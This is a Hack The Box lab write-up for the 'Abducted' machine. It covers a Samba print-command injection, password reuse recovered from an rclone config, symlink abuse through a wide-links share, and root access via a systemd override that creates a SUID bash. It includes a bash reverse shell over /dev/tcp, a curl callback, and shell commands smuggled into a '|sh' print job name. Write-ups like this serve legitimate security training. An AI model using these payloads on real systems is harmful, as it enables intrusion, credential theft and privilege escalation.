#htb #medium #linux #smb #null-auth #print-spooler #cve-2026-4480 #rce #cron #rclone #credentials-reuse #symlink #smb-wide-links #systemd #service-overrides
# Enumeration
## Nmap

```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nmap -p- --open -vvv --min-rate 5000 -n 10.129.244.177 -oG scan
Discovered open port 22/tcp on 10.129.244.177
Discovered open port 139/tcp on 10.129.244.177
Discovered open port 445/tcp on 10.129.244.177
```

Opened ports: 22,139,445

```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nmap -p 22,139,445 -sCV 10.129.244.177 -oN portscan.txt -Pn
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Host script results:
|_nbstat: NetBIOS name: ABDUCTED, NetBIOS user: <unknown>
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
```

## SMB

Check if **Null Auth** is enabled.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nxc smb 10.129.244.177 -u '' -p ''
SMB   10.129.244.177  445    ABDUCTED   [*] Unix - Samba (name:ABDUCTED) (domain:ABDUCTED) (signing:True) (SMBv1:None) (Null Auth:True)
```

List the shares.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nxc smb 10.129.244.177 -u '' -p '' --shares
Share           Remark
-----           ------
HP-Reception    Reception printer
projects        Hartley Group Project Files
transfer        Staff file transfer
IPC$            IPC Service (Hartley Group Document Services)
```

The only guest-accessible share is `HP-Reception`.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ smbclient //10.129.244.177/HP-Reception -N
```

Gather additional information from the SMB service.
```bash
rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
	ABDUCTED       Wk Sv PrQ Unx NT SNT Hartley Group Document Services
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03
```

The reported `os version` indicates that the host appears relatively old, altough it does not reveal the exact Samba version. However, the presence of a guest-accessible printer share matches the preconditions required by CVE-2026-4480, making it a good candidate for further testing.

# Foothold

[CVE-2026-4480](https://github.com/TheCyberGeek/CVE-2026-4480-PoC) affects Samba when it is configured with a printing command similar to:
```bash
print command = /usr/local/bin/handle_job.sh %s %J
```

The `%J` macro is replaced with the user-controlled document replacing only `'` with `_` allowing characters such as `|`, `;`, etc. are interpreted by the shell.

By setting the document name to `|sh`, the print command becomes a shell pipeline, causing the contents of the file to be redirected to `sh` and executed.

Create a file named `|sh` with a `curl` request.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ echo "curl IP:8080" > "|sh"
```

Setup a Python HTTP server.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ python -m http.server 8080
```

Create a print job.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
```

Check the HTTP server.
```bash
10.129.244.177 - - [02/Aug/2026 21:12:27] "GET / HTTP/1.1" 200
```

Receiving the HTTP request confirms that the payload was executed successfully, indicating that the server is vulnerable.
# Exploitation

## SMB

Encode a bash reverse shell in Base64.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ echo "bash -i >& /dev/tcp/IP/4444 0>&1" | base64
```

Write the Base64-encoded payload to a file named `|sh`.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ echo "echo <Base64 output> | base64 -d | bash" > "|sh"
```

Start a listener.
```bash
[hvidal@fedora] ~/d/h/h/m/a/scan
❯ nc -lnvp 4444
```

Create a print job.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ smbclient //10.129.244.177/HP-Reception -N -c 'print "|sh"'
```

## Post-exploitation

Enumerate the `cron-jobs`.
```bash
nobody@abducted:/$ ls -R /etc/cron*   
/etc/cron.d:
e2scrub_all
offsite-backup
sysstat
```

Read the backup job.
```bash
nobody@abducted:/$ cat /etc/cron.d/offsite-backup
30 2 * * * root /opt/offsite-backup/sync.sh >/dev/null 2>&1
```

The `sync.sh` script uses `rclone` to synchronize `/srv/projects` with an offsite SFTP server.
```bash
nobody@abducted:/$ cat /opt/offsite-backup/sync.sh
#!/bin/bash
/usr/bin/rclone --config /opt/offsite-backup/rclone.conf sync /srv/projects offsite:projects
```

Read the `rclone` config file.
```bash
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
shell_type = unix
```

Reveal the obfuscated password.
```bash
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXzvcib3SrpZ
```

The password is reused by the user `scott`, allowing SSH access.
```bash
[hvidal@fedora] ~/d/h/h/m/a/content
❯ ssh scott@10.129.244.177
```

Read the user flag.
```bash
scott@abducted:~$ cat user.txt
```

# Lateral movement

## SMB enumeration

Read the config file of Samba.
```bash
scott@abducted:~$ cat /etc/samba/shares.conf
[transfer]
   comment = Staff file transfer
   path = /srv/transfer
   valid users = scott
   force user = marcus
   read only = no
   wide links = yes
   browseable = yes
```

The `transfer` share is configured with `force user = marcus`. So every file operation performed through the share is executed as `marcus`. Also `wide links` is enabled which lets samba follow symbolic links outside the shared directory.
Since `scott` owns `/srv/transfer`, a symbolic link can be created pointing to `marcus`'s home directory, allowing an `authorized_keys` file to be written into `/home/marcus/.ssh`.

## Exploitation

Create the SSH key.
```bash
scott@abducted:/tmp$ ssh-keygen -t ed25519 -q -N '' -f /tmp/ssh
```

Create the symbolic link in `/srv/transfer`.
```bash
scott@abducted:/srv/transfer$ ln -s /home/marcus marcus
```

Create the `authorized_keys` file in `tmp`.
```bash
scott@abducted:/tmp$ cat ssh.pub > authorized_keys
```

Upload the `authorized_keys` file to `marcus/.ssh`
```bash
scott@abducted:/tmp$ smbclient //127.0.0.1/transfer -U scott%iXzvcib3SrpZ -c "mkdir marcus/.ssh; put /tmp/authorized_keys marcus/.ssh/authorized_keys"
```

Connect to `marcus` via SSH.
```bash
scott@abducted:/tmp$ ssh -i ssh marcus@127.0.0.1
```

# Privilege escalation

## Enumeration

`marcus` is member of the non-standard `operators` group.
```bash
marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

Find the group-writable files.
```bash
marcus@abducted:~$ find / -group operators -perm -g=w 2>/dev/null
/etc/systemd/system/smbd.service.d
```

`marcus` has writable permissions on the `smbd.service` *drop-in overrides* directory. This directory is used to store override files that modify the original `systemd` service configuration.

Check if `marcus` can restart the service.
```bash
marcus@abducted:~$ systemctl restart smbd
```

Since `marcus` can both restart the `smbd` service and write override files to `/etc/systemd/system/smbd.service.d`, it is possible to execute arbitrary commands as `root` by modifying the service configuration.
## Exploitation

Create a `systemd` override file in `/etc/systemd/system/smbd.service.d` that copies `/bin/bash` to `tmp` and adds SUID permissions to it.
```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/suid_bash
ExecStartPre=/bin/chmod 4755 /tmp/suid_bash
EOF
```

Reload the service.
```bash
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

Execute SUID copy of `bash` to obtain a `root` shell.
```bash
marcus@abducted:/tmp$ ./suid_bash -p
```

Read the `root` flag.
```bash
suid_bash-5.2$ cat /root/root.txt
```
